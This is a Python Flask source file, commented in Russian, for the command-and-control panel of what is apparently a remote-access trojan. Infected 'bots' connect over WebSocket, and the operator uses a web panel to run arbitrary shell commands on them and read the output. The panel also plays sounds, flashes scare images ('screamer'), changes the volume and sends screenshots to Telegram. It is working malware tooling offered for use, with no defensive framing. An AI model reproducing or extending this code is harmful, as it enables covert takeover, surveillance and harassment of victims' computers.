import time
import threading
import os
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from flask_sock import Sock

# --- Инициализация ---
app = Flask(__name__)
sock = Sock(app)

# --- Глобальные хранилища данных ---
bots, ws_map, command_results, volume_levels, events = {}, {}, {}, {}, {}

# --- СКАНИРОВАНИЕ ПАПОК С ФАЙЛАМИ ---
# Убедись, что папки audio_files и image_files существуют рядом с этим скриптом
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
AUDIO_DIR = os.path.join(BASE_DIR, 'audio_files')
IMAGE_DIR = os.path.join(BASE_DIR, 'image_files')

# Создаем папки, если их нет (важно для первого запуска на Railway)
os.makedirs(AUDIO_DIR, exist_ok=True)
os.makedirs(IMAGE_DIR, exist_ok=True)

# Сканируем содержимое папок
audio_files = [f for f in os.listdir(AUDIO_DIR) if os.path.isfile(os.path.join(AUDIO_DIR, f))]
image_files = [f for f in os.listdir(IMAGE_DIR) if os.path.isfile(os.path.join(IMAGE_DIR, f))]

# --- ФИНАЛЬНЫЙ HTML-ШАБЛОН v7 ---
HTML_TEMPLATE = """
<!doctype html>
<html lang="ru"><head><meta charset="utf-8"><title>Панель управления</title>
<style>body{font-family:monospace;background-color:#1a1a1a;color:#0f0;} .container{width:80%;margin:auto;} h1,h2{text-align:center;} table{width:100%;border-collapse:collapse;margin-bottom:20px;} th,td{border:1px solid #0f0;padding:8px;text-align:left;} .control-block{margin-top:20px;padding:15px;border:1px solid #0f0;} select,input[type="text"]{width:100%;padding:10px;margin-bottom:10px;background-color:#333;color:#0f0;border:1px solid #0f0;} input[type="submit"], button{background-color:#0f0;color:#1a1a1a;padding:10px;border:none;cursor:pointer;margin-right:10px;} pre{background-color:#000;padding:15px;border:1px solid #0f0;white-space:pre-wrap;word-wrap:break-word;min-height:50px;} input[type="range"]{width: 80%; vertical-align: middle;} output{padding-left:10px;}</style>
</head><body onload="document.getElementById('main_bot_select').dispatchEvent(new Event('change'))">
<div class="container"><h1>Панель управления v7 - Режиссёр</h1><h2>Активные боты: {{ bots|length }}</h2>
{% if bots %}
    <div class="control-block"><h3>Цель</h3><select id="main_bot_select" onchange="getCurrentVolume()">
    {% for bot_id in bots.keys() %}<option value="{{ bot_id }}">{{ bot_id }}</option>{% endfor %}</select></div>

    <!-- БЛОК УПРАВЛЕНИЯ МЕДИА -->
    <div class="control-block"><h3>Управление медиа</h3>
        <label for="audio_select">Воспроизвести звук:</label>
        <select id="audio_select"> {% for f in audio_files %}<option value="{{f}}">{{f}}</option>{% endfor %}</select>
        <button onclick="sendFileCommand('playsound', 'audio_select')">► Play</button>
        <br><br>
        <label for="image_select">Показать изображение (скример):</label>
        <select id="image_select"> {% for f in image_files %}<option value="{{f}}">{{f}}</option>{% endfor %}</select>
        <button onclick="sendFileCommand('showimage', 'image_select')">Show</button>
    </div>

    <div class="control-block"><h3>Выполнение команд</h3><input type="text" id="command_input" placeholder="Введите команду..."><button onclick="sendShellCommand()">Отправить</button></div>
    <div class="control-block"><h3>Управление звуком</h3><label for="volume_slider"&gt;Громкость:</label><br><input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendControlCommand('setvolume ' + this.value)"><output id="volume_output">50%</output><br><br><button onclick="sendControlCommand('mute')">Mute</button><button onclick="sendControlCommand('unmute')">Unmute</button></div>
    <div class="control-block"><h3>Специальные команды</h3><button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button></div>
    <div class="control-block"><h3>Результат последней команды</h3><pre id="result_output_pre">Ожидание команды...</pre></div>
{% else %}<p>Нет активных ботов.</p>{% endif %}
</div>
<script>
    const volumeSlider = document.getElementById('volume_slider'); const volumeOutput = document.getElementById('volume_output'); const resultOutput = document.getElementById('result_output_pre'); const mainBotSelect = document.getElementById('main_bot_select');
    if(volumeSlider) volumeSlider.addEventListener('input', () => { volumeOutput.value = volumeSlider.value + '%'; });
    async function sendControlCommand(command) { const botId = mainBotSelect.value; if (!botId) return; fetch('/api/control', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId, command: command }) }); }
    async function sendFileCommand(command_type, select_id) { const botId = mainBotSelect.value; const filename = document.getElementById(select_id).value; if (!botId || !filename) return; const full_command = command_type + ' ' + filename; fetch('/api/control', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId, command: full_command }) }); }
    async function sendShellCommand() { const botId = mainBotSelect.value; const command = document.getElementById('command_input').value; if (!botId || !command) return; resultOutput.textContent = 'Выполнение...'; try { const response = await fetch('/api/shell_command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId, command: command }) }); const data = await response.json(); if(data.status === 'ok') { resultOutput.textContent = data.result; } else { resultOutput.textContent = 'Ошибка: ' + data.message; } } catch (error) { resultOutput.textContent = 'Сетевая ошибка: ' + error; } }
    async function getCurrentVolume() { const botId = mainBotSelect.value; if (!botId) return; try { const response = await fetch('/api/get_volume', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: botId }) }); const data = await response.json(); if (data.status === 'ok') { volumeSlider.value = data.volume; volumeOutput.value = data.volume + '%'; } } catch (error) { console.error('Error getting volume:', error); } }
</script>
</body></html>"""

# --- БЭКЕНД-ЧАСТЬ ---

# Обработчик для раздачи твоих файлов ботам
@app.route('/files/<folder>/<filename>')
def serve_files(folder, filename):
    if folder == 'audio':
        return send_from_directory(AUDIO_DIR, filename)
    elif folder == 'image':
        return send_from_directory(IMAGE_DIR, filename)
    else:
        return "Not Found", 404

# Главная страница
@app.route('/')
def index():
    # Передаем списки файлов в шаблон для отображения
    return render_template_string(HTML_TEMPLATE, bots=bots, audio_files=audio_files, image_files=image_files)

# API для выполнения shell-команд
@app.route('/api/shell_command', methods=['POST'])
def api_shell_command():
    data = request.get_json()
    bot_id, cmd = data.get('bot_id'), data.get('command')
    result_text = "Ошибка."
    if bot_id and cmd and bot_id in bots:
        try:
            ws = bots[bot_id]
            if bot_id in command_results: del command_results[bot_id]
            ws.send(cmd)
            for _ in range(50): # Ждем ответ до 5 секунд
                if bot_id in command_results:
                    result_text = command_results.pop(bot_id)
                    return jsonify({'status': 'ok', 'result': result_text})
                time.sleep(0.1)
            return jsonify({'status': 'error', 'message': 'Бот не ответил за 5 секунд.'}), 408
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'error', 'message': 'Неверный запрос.'}), 400

# API для "тихих" команд (звук, скриншот)
@app.route('/api/control', methods=['POST'])
def api_control():
    data = request.get_json()
    bot_id, cmd = data.get('bot_id'), data.get('command')
    if bot_id and cmd and bot_id in bots:
        try:
            bots[bot_id].send(cmd)
            return jsonify({'status': 'ok'})
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

# API для запроса громкости
@app.route('/api/get_volume', methods=['POST'])
def api_get_volume():
    bot_id = request.json.get('bot_id')
    if bot_id in bots:
        try:
            events[bot_id] = threading.Event()
            bots[bot_id].send('getvolume')
            if events[bot_id].wait(timeout=3):
                level = volume_levels.get(bot_id, 50)
                return jsonify({'status': 'ok', 'volume': level})
            else:
                return jsonify({'status': 'timeout'}), 408
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    return jsonify({'status': 'not_found'}), 404

# WebSocket-обработчик
@sock.route('/ws')
def websocket_handler(ws):
    bot_ip = ws.environ.get('HTTP_X_FORWARDED_FOR', ws.environ.get('REMOTE_ADDR', 'unknown_ip'))
    bots[bot_ip] = ws
    ws_map[ws] = bot_ip
    print(f"[+] Новый бот: {bot_ip}")
    try:
        while True:
            result = ws.receive()
            current_bot_ip = ws_map.get(ws)
            if not current_bot_ip: continue
            if result.startswith('VOL_LEVEL:'):
                level_str = result.split(':')[1]
                if level_str.isdigit():
                    volume_levels[current_bot_ip] = int(level_str)
                    if current_bot_ip in events and not events[current_bot_ip].is_set():
                        events[current_bot_ip].set()
            else:
                command_results[current_bot_ip] = result
    except Exception:
        dead_bot_ip = ws_map.get(ws, 'unknown')
        if dead_bot_ip != 'unknown':
            for d in [bots, ws_map, volume_levels, command_results, events]:
                if dead_bot_ip in d:
                    del d[dead_bot_ip]
        print(f"[-] Бот {dead_bot_ip} отвалился.")

# Точка входа
if __name__ == '__main__':
    print("Этот скрипт предназначен для запуска через Gunicorn.")
